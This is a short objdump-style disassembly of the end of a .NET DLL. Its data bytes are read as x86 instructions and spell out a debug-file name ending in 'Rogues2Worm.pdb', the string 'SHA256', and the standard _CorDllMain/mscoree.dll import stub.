1000317b:	6f                   	outsl  %ds:(%esi),(%dx)
1000317c:	69 74 52 6f 67 75 65 	imul   $0x73657567,0x6f(%edx,%edx,2),%esi
10003183:	73 
10003184:	32 57 6f             	xor    0x6f(%edi),%dl
10003187:	72 6d                	jb     0x100031f6
10003189:	2e 70 64             	jo,pn  0x100031f0
1000318c:	62 00                	bound  %eax,(%eax)
	...
1000322a:	00 00                	add    %al,(%eax)
1000322c:	53                   	push   %ebx
1000322d:	48                   	dec    %eax
1000322e:	41                   	inc    %ecx
1000322f:	32 35 36 00 7f f5    	xor    0xf57f0036,%dh
10003235:	35 1e ab 27 5f       	xor    $0x5f27ab1e,%eax
1000323a:	ed                   	in     (%dx),%eax
1000323b:	ec                   	in     (%dx),%al
1000323c:	5b                   	pop    %ebx
1000323d:	1d b9 d2 7c 32       	sbb    $0x327cd2b9,%eax
10003242:	f1                   	int1
10003243:	81 04 c1 1d 92 66 c3 	addl   $0xc366921d,(%ecx,%eax,8)
1000324a:	3e e8 4b 11 db e1    	ds call 0xf1db439b
10003250:	54                   	push   %esp
10003251:	4c                   	dec    %esp
10003252:	27                   	daa
10003253:	7b 32                	jnp    0x10003287
	...
1000325d:	00 00                	add    %al,(%eax)
1000325f:	95                   	xchg   %eax,%ebp
10003260:	32 00                	xor    (%eax),%al
10003262:	00 00                	add    %al,(%eax)
10003264:	20 00                	and    %al,(%eax)
	...
1000327a:	00 87 32 00 00 00    	add    %al,0x32(%edi)
	...
10003288:	00 5f 43             	add    %bl,0x43(%edi)
1000328b:	6f                   	outsl  %ds:(%esi),(%dx)
1000328c:	72 44                	jb     0x100032d2
1000328e:	6c                   	insb   (%dx),%es:(%edi)
1000328f:	6c                   	insb   (%dx),%es:(%edi)
10003290:	4d                   	dec    %ebp
10003291:	61                   	popa
10003292:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
10003299:	72 65                	jb     0x10003300
1000329b:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
1000329f:	6c                   	insb   (%dx),%es:(%edi)
100032a0:	00 00                	add    %al,(%eax)
100032a2:	00 00                	add    %al,(%eax)
100032a4:	00 00                	add    %al,(%eax)
100032a6:	ff 25 00 20 00 10    	jmp    *0x10002000
